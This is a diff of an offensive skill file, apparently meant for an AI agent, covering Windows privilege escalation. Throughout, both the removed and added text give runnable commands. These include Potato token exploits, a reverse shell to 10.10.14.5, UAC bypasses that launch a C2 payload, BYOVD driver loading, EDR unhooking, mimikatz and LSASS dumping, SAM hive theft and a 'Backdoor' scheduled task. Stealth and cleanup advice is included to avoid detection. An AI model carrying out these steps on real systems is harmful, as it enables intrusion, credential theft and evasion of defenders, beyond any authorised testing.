@@ -1,353 +1,123 @@
 ---
 name: privesc-windows
-description: Windows privilege escalation — token abuse, service exploitation, UAC bypass, credential harvesting, AD escalation paths
+description: Windows local privilege escalation — automated triage, SeImpersonate Potato chains (GodPotato/SigmaPotato/PrintNotifyPotato), service & DLL hijacking, UAC bypass (fodhelper/ICMLuaUtil/IEditionUpgradeManager), kernel EoP CVEs + BYOVD (CVE-2025-29824/32701/62215), privileged-token-rights abuse, and stealthy credential harvesting (LSASS/SAM/DPAPI)
 metadata:
   type: offensive
   phase: post-exploitation
-  tools: winpeas, seatbelt, sharpup, rubeus, mimikatz, powerview, bloodhound
+  tools: winpeas, seatbelt, privesccheck, sharpup, godpotato, sigmapotato, printnotifypotato, fullpowers, edrsandblast, mimikatz, nanodump, pypykatz, impacket-secretsdump
+  mitre: TA0004
 kill_chain:
   phase: [exploit, actions]
   step: [4, 7]
-  attck_tactics: [TA0004]
+  attck_tactics: [TA0004, TA0005, TA0006]
+  attck_techniques: [T1134, T1134.001, T1134.002, T1543.003, T1574.001, T1574.009, T1574.010, T1548.002, T1068, T1211, T1003.001, T1003.002, T1555.004, T1053.005, T1547.001]
 depends_on: [network-attack, exploit-development]
-feeds_into: [red-team-ops, advanced-redteam, active-directory-attack]
-inputs: [shell_access, os_fingerprint]
-outputs: [elevated_access, finding_record]
+feeds_into: [red-team-ops, advanced-redteam, active-directory-attack, edr-evasion]
+inputs: [shell_access, os_fingerprint, service_account_context]
+outputs: [elevated_access, system_token, credential_dump, finding_record]
+references:
+  - references/enumeration-triage.md
+  - references/token-impersonation-potatoes.md
+  - references/service-dll-hijacking.md
+  - references/uac-bypass.md
+  - references/kernel-byovd.md
+  - references/credential-harvesting.md
+scripts:
+  - scripts/win_privesc_triage.ps1
+  - scripts/check_potato.py
+  - scripts/service_hijack_audit.ps1
+  - scripts/uac_bypass.ps1
+  - scripts/byovd_loader.c
+  - scripts/lsass_snapshot_dump.c
 ---
 
 # Windows Privilege Escalation
 
 ## When to Activate
 
-- Gained initial shell on Windows target, need SYSTEM/Admin
-- Post-exploitation privilege escalation
-- Active Directory privilege escalation
-- UAC bypass scenarios
+- Gained an initial shell / foothold on Windows and need to reach Administrator or NT AUTHORITY\SYSTEM
+- Shell runs as a service account (IIS APPPOOL, MSSQL, Local/Network Service) holding `SeImpersonatePrivilege`
+- Standard-user → admin via UAC bypass (medium → high integrity) on a local-admin-group member
+- Service / DLL / scheduled-task misconfiguration hunting on the host
+- Kernel EoP via an unpatched local CVE or Bring-Your-Own-Vulnerable-Driver (admin → kernel/PPL)
+- Privileged token-right abuse (`SeBackup`/`SeRestore`/`SeTakeOwnership`/`SeLoadDriver`/`SeDebug`)
+- Local credential harvesting (LSASS, SAM/SYSTEM, DPAPI) to fuel lateral movement
 
-## Automated Enumeration
+## Technique Map
 
-```powershell
-# WinPEAS
-.\winPEASx64.exe
+| Technique | ATT&CK | CWE | Reference | Script |
+|-----------|--------|-----|-----------|--------|
+| Automated enumeration (winPEAS/Seatbelt/PrivescCheck) | T1082, T1518 | CWE-1188 | references/enumeration-triage.md | scripts/win_privesc_triage.ps1 |
+| Token-privilege triage + FullPowers recovery | T1134.001 | CWE-269 | references/enumeration-triage.md | scripts/win_privesc_triage.ps1 |
+| SeImpersonate Potato (GodPotato/SigmaPotato/PrintNotify) | T1134.001, T1134.002 | CWE-269 | references/token-impersonation-potatoes.md | scripts/check_potato.py |
+| Named-pipe / token impersonation primitives | T1134.001 | CWE-269 | references/token-impersonation-potatoes.md | scripts/check_potato.py |
+| Unquoted service path | T1574.009 | CWE-428 | references/service-dll-hijacking.md | scripts/service_hijack_audit.ps1 |
+| Weak service ACL / SERVICE_CHANGE_CONFIG | T1543.003 | CWE-732 | references/service-dll-hijacking.md | scripts/service_hijack_audit.ps1 |
+| DLL / phantom DLL hijack (CVE-2025-1729, CVE-2024-28827) | T1574.001, T1574.010 | CWE-427 | references/service-dll-hijacking.md | scripts/service_hijack_audit.ps1 |
+| UAC bypass — fodhelper/computerdefaults/eventvwr | T1548.002 | CWE-269 | references/uac-bypass.md | scripts/uac_bypass.ps1 |
+| UAC bypass — ICMLuaUtil / IEditionUpgradeManager COM | T1548.002 | CWE-269 | references/uac-bypass.md | scripts/uac_bypass.ps1 |
+| AlwaysInstallElevated MSI | T1548.002 | CWE-250 | references/uac-bypass.md | scripts/uac_bypass.ps1 |
+| Kernel EoP CVE (CLFS CVE-2025-29824/32701; CVE-2025-62215) | T1068 | CWE-416, CWE-362 | references/kernel-byovd.md | scripts/byovd_loader.c |
+| BYOVD admin→kernel / EDR-blind (CVE-2025-7771, EDRSandblast) | T1068, T1562.001 | CWE-782 | references/kernel-byovd.md | scripts/byovd_loader.c |
+| Privileged token rights (SeBackup/SeRestore/SeLoadDriver/SeDebug) | T1134, T1068 | CWE-269 | references/kernel-byovd.md | scripts/byovd_loader.c |
+| LSASS dump (comsvcs / PssCaptureSnapshot / nanodump) | T1003.001 | CWE-522 | references/credential-harvesting.md | scripts/lsass_snapshot_dump.c |
+| SAM/SYSTEM + VSS offline secretsdump | T1003.002 | CWE-522 | references/credential-harvesting.md | scripts/lsass_snapshot_dump.c |
+| DPAPI / credential vault / browser secrets | T1555.004, T1555.003 | CWE-522 | references/credential-harvesting.md | - |
 
-# Seatbelt
-.\Seatbelt.exe -group=all
-
-# SharpUp
-.\SharpUp.exe audit
-
-# PowerUp
-. .\PowerUp.ps1; Invoke-AllChecks
-```
-
-## Token Impersonation (SeImpersonatePrivilege)
-
-```bash
-# Check privileges
-whoami /priv
-
-# If SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege:
-# Potato family exploits (NTLM relay to local SYSTEM)
-
-# PrintSpoofer (Windows 10/Server 2016-2019)
-PrintSpoofer.exe -i -c "cmd /c whoami"
-PrintSpoofer.exe -c "C:\path\reverse_shell.exe"
-
-# GodPotato (works on all Windows versions)
-GodPotato.exe -cmd "cmd /c whoami"
-
-# JuicyPotatoNG
-JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
-
-# SweetPotato
-SweetPotato.exe -p C:\path\shell.exe
-```
-
-## Service Exploitation
+## Quick Start
 
 ```powershell
-# Unquoted service paths
-wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"
-# If path has spaces and no quotes: place binary at first space
+# 0. Identity + token rights — this decides the whole strategy
+whoami /priv /groups
+powershell -ep bypass -File scripts/win_privesc_triage.ps1 -Quick
 
-# Weak service permissions
-# Check with accesschk:
-accesschk.exe /accepteula -uwcqv "Authenticated Users" *
-# If SERVICE_CHANGE_CONFIG:
-sc config VulnService binpath= "C:\path\shell.exe"
-sc stop VulnService && sc start VulnService
+# 1. Full automated enumeration (pick the AV-safest)
+.\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report pc_%COMPUTERNAME% -Format TXT,HTML
+.\Seatbelt.exe -group=all -full        # build it yourself; do not trust prebuilt binaries
+.\winPEASany_ofs.bat                    # .bat variant is less AV-flagged than the .exe
 
-# Writable service binary
-icacls "C:\Program Files\Service\binary.exe"
-# If writable: replace with malicious binary, restart service
+# 2a. Service-account shell with SeImpersonate* -> Potato to SYSTEM
+python3 scripts/check_potato.py --priv "$(whoami /priv)"   # picks the right Potato for the host
+.\GodPotato-NET4.exe -cmd "cmd /c whoami"                  # Server 2012-2022, no outbound
+.\SigmaPotato.exe --revshell 10.10.14.5 443                # fileless .NET-reflection variant
+# stripped token (Local/Network Service)? recover privileges first:
+.\FullPowers.exe -c "C:\Windows\Tasks\GodPotato-NET4.exe -cmd cmd" -z
 
-# DLL hijacking
-# Process Monitor: filter for NAME NOT FOUND on DLL loads
-# Place malicious DLL in searched path before legitimate one
+# 2b. No SeImpersonate -> hunt service/DLL/scheduled-task misconfig
+powershell -ep bypass -File scripts/service_hijack_audit.ps1   # unquoted/weak-ACL/writable-bin/PATH
+
+# 2c. Standard user in local-admin group, UAC on -> bypass to high integrity
+powershell -ep bypass -File scripts/uac_bypass.ps1 -Method fodhelper -Payload "cmd.exe /c <c2>"
+
+# 2d. Already admin -> kernel/PPL via BYOVD; then harvest creds
+#     (verify driver is NOT on Microsoft blocklist for the build first)
+.\EDRSandblast.exe --kernelmode dump_lsass --usermode unhook
+
+# 3. Credentials (run from SYSTEM/admin)
+gcc scripts/lsass_snapshot_dump.c -o snap.exe -lDbghelp   # PssCaptureSnapshot dump (stealthier)
+.\snap.exe lsass.dmp ; pypykatz lsa minidump lsass.dmp    # parse offline, off-host
+reg save HKLM\SAM sam.bak & reg save HKLM\SYSTEM sys.bak  # impacket-secretsdump -sam sam.bak -system sys.bak LOCAL
 ```
 
-## Registry Exploits
+## OPSEC & Detection (summary)
 
-```powershell
-# AlwaysInstallElevated
-reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-# If both = 1: msfvenom -p windows/x64/shell_reverse_tcp ... -f msi > shell.msi
-msiexec /quiet /qn /i shell.msi
+| Technique | Telemetry / IOC | Detection (Sigma / EDR) | OPSEC note |
+|-----------|-----------------|--------------------------|------------|
+| winPEAS/Seatbelt enum | Mass reg/WMI/service queries; winPEAS.exe on disk (heavily AV-flagged) | EDR hacktool sigs on winPEAS/Seatbelt names+hashes | Build Seatbelt yourself; prefer `.bat`/obfuscated winPEAS or `PrivescCheck.ps1` in-memory |
+| Potato (Impersonate) | DCOM/OXID RPC, named-pipe create; SYSTEM child of IIS/MSSQL worker | Sigma `win_susp_potato`; 4674/4688 child SYSTEM under w3wp/sqlservr | Match the COM/RPC surface left open; PrintNotifyPotato avoids RPC redirector that Defender blocks |
+| Service hijack | 7045 service install; `sc config` binpath change; service binary write | Sigma `win_susp_service_path`/`sc_config`; 4697/7045 + new binary hash | Restore original binPath/binary after; stage payload outside `C:\Windows` |
+| DLL/phantom hijack | Non-MS DLL loaded by SYSTEM process from writable/ProgramData/%PATH% dir | Elastic `phantom_dll`; Sysmon EID 7 unsigned DLL in odd path | Proxy the real DLL to keep app stable; clean the planted DLL post-exec |
+| UAC bypass | HKCU `ms-settings`/`mscfile` shell\open\command writes; fodhelper child cmd | Elastic `LUA://HdAutoAp` token attr; Sigma fodhelper/eventvwr reg hijack | Use reg symlink + key rename (UACME m3.5+); delete HKCU keys immediately after trigger |
+| Kernel EoP / BYOVD | New 3rd-party `.sys` load (7045/6); SYSTEM token on low-priv proc; EDR driver unload | Sigma `vuln_driver_load`; MS Vulnerable Driver Blocklist; ETWTi token-swap | Driver load is loud + persistent — confirm not blocklisted; unload + delete `.sys`; restore LSTAR/MSR |
+| LSASS dump | Handle to lsass w/ PROCESS_VM_READ/DUP; comsvcs MiniDump cmdline; .dmp on disk | Sysmon EID 10 callstack dbghelp/dbgcore; Splunk comsvcs MiniDump; Elastic PssCaptureSnapshot | Use snapshot/handle-dup + parse off-host; avoid `lsass.dmp` literal name; clean the dump |
+| SAM/VSS | `reg save HKLM\SAM`; `vssadmin create shadow`; GLOBALROOT copies | Sigma `reg_save_sam`; 8222 VSS; vssadmin process creation | Delete shadow + .bak hives; parse offline with secretsdump LOCAL |
+| DPAPI/vault | Reads of `\Microsoft\Protect\*` masterkeys + `\Credentials\*` blobs | EDR access to DPAPI dirs; lsass `dpapi::` calls | Decrypt off-host with masterkey/domain backup key; touch only target user's blobs |
 
-# AutoRun programs
-reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
-reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
-# Check if any referenced binary is writable
+## Deep Dives
 
-# Stored credentials
-reg query HKLM /f password /t REG_SZ /s
-reg query HKCU /f password /t REG_SZ /s
-cmdkey /list  # Stored Windows credentials
-```
-
-## UAC Bypass
-
-```powershell
-# Check UAC level
-reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
-
-# Fodhelper bypass (Windows 10)
-reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
-reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /f
-fodhelper.exe
-
-# Eventvwr bypass
-reg add HKCU\Software\Classes\mscfile\shell\open\command /d "cmd.exe" /f
-eventvwr.exe
-
-# CMSTPLUA COM object
-# Requires: medium integrity, local admin group member
-```
-
-## Credential Harvesting
-
-```powershell
-# Mimikatz
-mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
-mimikatz.exe "privilege::debug" "lsadump::sam" "exit"
-mimikatz.exe "privilege::debug" "lsadump::dcsync /user:Administrator" "exit"
-
-# SAM/SYSTEM backup
-reg save HKLM\SAM sam.bak
-reg save HKLM\SYSTEM system.bak
-# Offline: impacket-secretsdump -sam sam.bak -system system.bak LOCAL
-
-# DPAPI
-mimikatz "dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\*"
-
-# Cached credentials
-mimikatz "lsadump::cache"
-
-# Kerberos tickets
-mimikatz "sekurlsa::tickets /export"
-# Or Rubeus:
-Rubeus.exe dump /nowrap
-Rubeus.exe triage
-```
-
-## Scheduled Tasks
-
-```powershell
-# List tasks
-schtasks /query /fo LIST /v | findstr /i "task\|run\|author"
-
-# Check writable task binaries
-# If task runs as SYSTEM with writable binary path:
-# Replace binary → wait for execution
-
-# Create task (if admin)
-schtasks /create /tn "Backdoor" /tr "C:\path\shell.exe" /sc onlogon /ru SYSTEM
-```
-
-## Named Pipes & Impersonation
-
-```powershell
-# List named pipes
-[System.IO.Directory]::GetFiles("\\.\pipe\")
-
-# Create pipe server, wait for privileged client connection
-# Impersonate connected client token
-# Tools: PipeServerImpersonate, custom .NET
-```
-
-## AD-Specific Escalation
-
-```powershell
-# Kerberoasting
-Rubeus.exe kerberoast /outfile:hashes.txt
-hashcat -m 13100 hashes.txt wordlist.txt
-
-# AS-REP Roasting
-Rubeus.exe asreproast /outfile:asrep.txt
-hashcat -m 18200 asrep.txt wordlist.txt
-
-# Constrained Delegation abuse
-Rubeus.exe s4u /user:svc_account /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/target /ptt
-
-# Resource-Based Constrained Delegation
-# If GenericWrite on computer object:
-# Add msDS-AllowedToActOnBehalfOfOtherIdentity
-# Then S4U2Self + S4U2Proxy
-
-# Shadow Credentials (if GenericWrite on user/computer)
-Whisker.exe add /target:victim /domain:domain.com
-Rubeus.exe asktgt /user:victim /certificate:cert.pfx /password:pass /ptt
-
-# ADCS (Certificate Services)
-Certify.exe find /vulnerable
-Certify.exe request /ca:CA /template:VulnTemplate /altname:Administrator
-```
-
-## Advanced: Token Manipulation
-
-### Token Impersonation Deep Dive
-```c
-// Windows tokens: Primary (process identity) vs Impersonation (thread identity)
-// Impersonation levels: Anonymous < Identification < Impersonation < Delegation
-// Need Impersonation or Delegation level to actually use the token
-
-// Token theft from another process (requires SeDebugPrivilege):
-HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, targetPid);
-HANDLE hToken;
-OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken);
-HANDLE hDupToken;
-DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hDupToken);
-CreateProcessWithTokenW(hDupToken, 0, L"cmd.exe", NULL, 0, NULL, NULL, &si, &pi);
-
-// EfsPotato — abuse Encrypting File System for SYSTEM token
-// CoercedPotato — consolidates multiple coercion techniques
-// GodPotato — works across all Windows versions via DCOM
-```
-
-### Token Privilege Abuse
-```powershell
-# SeBackupPrivilege → read any file (bypass DACL)
-robocopy /b C:\Windows\System32\config C:\temp SAM SYSTEM
-# Then: impacket-secretsdump -sam sam -system system LOCAL
-
-# SeRestorePrivilege → write any file (bypass DACL)
-# Overwrite protected files, plant DLL for hijacking
-
-# SeTakeOwnershipPrivilege → take ownership of any object
-# Take ownership of HKLM\SYSTEM key → modify services
-
-# SeLoadDriverPrivilege → load kernel driver (BYOVD)
-# Load vulnerable signed driver → kernel R/W → SYSTEM
-
-# SeManageVolumePrivilege → read raw disk
-# Bypass file permissions by reading raw NTFS
-
-# SeImpersonatePrivilege → Potato family exploits
-# PrintSpoofer, GodPotato, JuicyPotatoNG, EfsPotato, CoercedPotato
-```
-
-### Named Pipe Impersonation
-```c
-// Create pipe → trick privileged service into connecting → impersonate
-HANDLE hPipe = CreateNamedPipeA("\\\\.\\pipe\\evil",
-    PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_WAIT, 1, 1024, 1024, 0, NULL);
-ConnectNamedPipe(hPipe, NULL);
-ImpersonateNamedPipeClient(hPipe);
-// Now running as the connected client's identity
-```
-
-## Advanced: DPAPI Exploitation
-
-```powershell
-# DPAPI protects: browser passwords, WiFi keys, certificates, credential vault
-
-# Find DPAPI blobs
-dir /s /b C:\Users\*\AppData\Local\Microsoft\Credentials\*
-dir /s /b C:\Users\*\AppData\Roaming\Microsoft\Protect\*  # Master keys
-
-# Decrypt with Mimikatz
-mimikatz # dpapi::masterkey /in:MASTER_KEY_FILE /rpc  # Uses DC to decrypt
-mimikatz # dpapi::cred /in:CRED_BLOB  # Decrypt credential blob
-mimikatz # dpapi::chrome /in:"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" /unprotect
-
-# Domain DPAPI backup key (requires DA)
-mimikatz # lsadump::backupkeys /system:DC_IP /export
-# With backup key → decrypt ANY user's DPAPI blobs
-```
-
-## Advanced: COM Object Abuse
-
-### UAC Bypass via COM
-```powershell
-# CMSTPLUA COM object (auto-elevate)
-$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("3E5FC7F9-9A51-4367-9063-A120244FBEC7"))
-$com.ShellExec("cmd.exe", "/c whoami", "", "runas", 0)
-
-# ICMLuaUtil COM object
-$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("D2E7025F-6BE0-4FBF-B128-10F02B5E3690"))
-$com.ShellExec("C:\evil.exe", $null, $null, $null, 0)
-```
-
-### DCOM Lateral Movement
-```powershell
-# MMC20.Application (requires local admin on target)
-$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("49B2791A-B1AE-4C90-9B8E-E860BA07F889"), "TARGET")
-$com.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c payload", "7")
-
-# ShellWindows
-$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39", "TARGET"))
-$com.item().Document.Application.ShellExecute("cmd.exe", "/c payload", "", $null, 0)
-```
-
-## Advanced: WSL & Hyper-V Escape
-
-```bash
-# WSL filesystem: C:\Users\USER\AppData\Local\Packages\...\LocalState\rootfs\
-# From Windows: read WSL files (SSH keys, credentials)
-# From WSL: access Windows at /mnt/c/ with same user privileges
-
-# WSL as persistence:
-# Scheduled task → wsl.exe -e bash -c "reverse_shell"
-# WSL processes appear as wsl.exe → may bypass application control
-
-# Hyper-V escape (rare, high-impact):
-# CVE-2021-28476 (vmswitch RCE) — guest-to-host
-# Requires: specific VM configuration + unpatched host
-```
-
-## Advanced: Credential Harvesting Techniques
-
-### LSASS Dump Without Mimikatz
-```powershell
-# comsvcs.dll MiniDump (LOLBin — no external tools)
-rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\temp\lsass.dmp full
-
-# ProcDump (Sysinternals — signed by Microsoft)
-procdump.exe -accepteula -ma lsass.exe lsass.dmp
-
-# Task Manager (GUI — manual)
-# Right-click lsass.exe → Create dump file
-
-# Direct syscall dump (custom tool — avoids API hooks)
-# Use NtReadVirtualMemory with direct syscall to read LSASS memory
-
-# Silent Process Exit (abuse WER)
-# Configure LSASS to dump on "exit" via registry
-# Trigger: reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\lsass.exe"
-
-# Parse dump offline:
-pypykatz lsa minidump lsass.dmp
-mimikatz # sekurlsa::minidump lsass.dmp
-```
-
-### SAM/SYSTEM Without Admin (Volume Shadow Copy)
-```powershell
-# If SeBackupPrivilege or access to shadow copies:
-vssadmin create shadow /for=C:
-copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\
-copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\
-
-# Parse offline:
-impacket-secretsdump -sam SAM -system SYSTEM LOCAL
-```
+- **references/enumeration-triage.md** — Decision tree from `whoami /priv` + groups + integrity; winPEAS/Seatbelt/PrivescCheck/SharpUp usage and AV trade-offs; token-privilege classification table; FullPowers stripped-token recovery; autologon / stored-cred / GPP / scheduled-task XML enumeration.
+- **references/token-impersonation-potatoes.md** — Token model (primary vs impersonation, levels), the full 2024-2026 Potato family (GodPotato, SigmaPotato, PrintNotifyPotato, DCOMPotato, EfsPotato, RoguePotato, PrintSpoofer, JuicyPotatoNG), per-OS selection, named-pipe + `DuplicateTokenEx`/`CreateProcessWithTokenW` primitives, detection.
+- **references/service-dll-hijacking.md** — Unquoted service path (CWE-428), weak ACL / `SERVICE_CHANGE_CONFIG` / writable binary, DLL search order + KnownDLLs, phantom DLL hijack with real 2025 cases (CVE-2025-1729 Lenovo TPQM, CVE-2024-28827 Checkmk), DLL-proxy stub, scheduled-task abuse.
+- **references/uac-bypass.md** — Auto-elevated binary model; fodhelper/computerdefaults/eventvwr/sdclt registry hijacks; ICMLuaUtil & IEditionUpgradeManager COM elevation (2024-2025 status); SilentCleanup env-var hijack; AlwaysInstallElevated MSI; reg-symlink evasion; `LUA://HdAutoAp` detection.
+- **references/kernel-byovd.md** — 2025 kernel EoP CVEs (CLFS CVE-2025-29824 & CVE-2025-32701 in-the-wild, Win32k CVE-2025-24983, kernel race CVE-2025-62215); BYOVD theory + DSE/blocklist gap; LOLDrivers, EDRSandblast, GodFault/PPLFault driverless; MSR/LSTAR ring-0; privileged token-right abuse (SeBackup/SeRestore/SeTakeOwnership/SeLoadDriver/SeDebug).
+- **references/credential-harvesting.md** — LSASS dumping (comsvcs LOLBin, PssCaptureSnapshot, handle-dup, nanodump, direct-syscall), PPL/RunAsPPL bypass, SAM/SYSTEM + VSS shadow copy, offline secretsdump/pypykatz, DPAPI masterkeys + domain backup key, browser/credential-vault secrets, detection per method.
